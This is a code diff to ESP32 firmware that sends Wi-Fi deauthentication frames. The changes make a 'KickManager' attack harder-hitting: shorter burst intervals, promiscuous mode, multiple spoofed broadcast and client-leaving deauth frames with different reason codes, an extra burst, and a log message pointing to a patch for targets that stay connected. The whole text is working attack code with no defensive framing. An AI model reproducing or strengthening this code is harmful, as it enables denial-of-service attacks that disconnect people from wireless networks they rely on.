@@ -11,8 +11,8 @@
 static const uint8_t DEAUTH_BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 /* Space out 80211_tx calls to avoid ESP32 stopping (doc: wait for send
  * completion). */
-#define DEAUTH_INTERVAL_MS 150 /* one burst per 150 ms */
-#define DEAUTH_DELAY_BETWEEN_PACKETS_MS 50
+#define DEAUTH_INTERVAL_MS 100
+#define DEAUTH_DELAY_BETWEEN_PACKETS_MS 30
 
 KickManager::KickManager()
     : targetChannel_(1), targetSet_(false), targetIsOwnAP_(false),
@@ -67,12 +67,15 @@ bool KickManager::startAttack() {
   attacking_ = true;
   lastBurstMs_ = millis();
   packetCount_ = 0;
-  Serial.println("[KICK] Attack START.");
+  esp_wifi_set_promiscuous(true);
+  Serial.println("[KICK] Attack START. (If targets don't disconnect, apply "
+                 "esp32_deauth_patch)");
   return true;
 }
 
 void KickManager::stopAttack() {
   attacking_ = false;
+  esp_wifi_set_promiscuous(false);
   Serial.println("[KICK] Attack STOP.");
 }
 
@@ -94,40 +97,50 @@ void KickManager::sendDeauthBurst() {
   deauthBuf_[1] = 0x00;
   deauthBuf_[2] = 0x00;
   deauthBuf_[3] = 0x00;
-  memcpy(deauthBuf_ + 4, DEAUTH_BROADCAST, 6); // DA = broadcast
-  memcpy(deauthBuf_ + 10, targetBSSID_, 6);    // SA = AP
-  memcpy(deauthBuf_ + 16, targetBSSID_, 6);    // BSSID = AP
   deauthBuf_[22] = 0x00;
   deauthBuf_[23] = 0x00;
-  deauthBuf_[24] = 0x07; // reason: Class 3 frame received from nonassociated
-                         // station (more effective)
+
+  // 1) DA=broadcast, SA=AP — reason 7 and 1
+  memcpy(deauthBuf_ + 4, DEAUTH_BROADCAST, 6);
+  memcpy(deauthBuf_ + 10, targetBSSID_, 6);
+  memcpy(deauthBuf_ + 16, targetBSSID_, 6);
+  deauthBuf_[24] = 0x07;
   deauthBuf_[25] = 0x00;
-
-  esp_err_t e =
-      esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, sizeof(deauthBuf_), false);
-  if (e == ESP_OK) {
+  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
     packetCount_++;
-  } else if (e != ESP_ERR_WIFI_NOT_INIT) {
-    Serial.printf("[KICK] Deauth send error: %d\n", e);
-  }
-
+  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
+  deauthBuf_[24] = 0x01;
+  deauthBuf_[25] = 0x00;
+  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
+    packetCount_++;
   delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
 
-  // Second variant: DA=AP, SA=broadcast (fake client leaving)
-  deauthBuf_[4] = targetBSSID_[0];
-  deauthBuf_[5] = targetBSSID_[1];
-  deauthBuf_[6] = targetBSSID_[2];
-  deauthBuf_[7] = targetBSSID_[3];
-  deauthBuf_[8] = targetBSSID_[4];
-  deauthBuf_[9] = targetBSSID_[5];
+  // 2) DA=AP, SA=broadcast (fake client leaving)
+  memcpy(deauthBuf_ + 4, targetBSSID_, 6);
   memcpy(deauthBuf_ + 10, DEAUTH_BROADCAST, 6);
   memcpy(deauthBuf_ + 16, targetBSSID_, 6);
-  e = esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, sizeof(deauthBuf_), false);
-  if (e == ESP_OK) {
+  deauthBuf_[24] = 0x07;
+  deauthBuf_[25] = 0x00;
+  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
     packetCount_++;
-  } else if (e != ESP_ERR_WIFI_NOT_INIT) {
-    Serial.printf("[KICK] Deauth send error (variant 2): %d\n", e);
-  }
+  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
+  deauthBuf_[24] = 0x01;
+  deauthBuf_[25] = 0x00;
+  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
+    packetCount_++;
+  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
+
+  // 3) Extra broadcast deauth
+  memcpy(deauthBuf_ + 4, DEAUTH_BROADCAST, 6);
+  memcpy(deauthBuf_ + 10, targetBSSID_, 6);
+  memcpy(deauthBuf_ + 16, targetBSSID_, 6);
+  deauthBuf_[24] = 0x07;
+  deauthBuf_[25] = 0x00;
+  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
+    packetCount_++;
+  delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
+  if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
+    packetCount_++;
 }
 
 void KickManager::tick() {
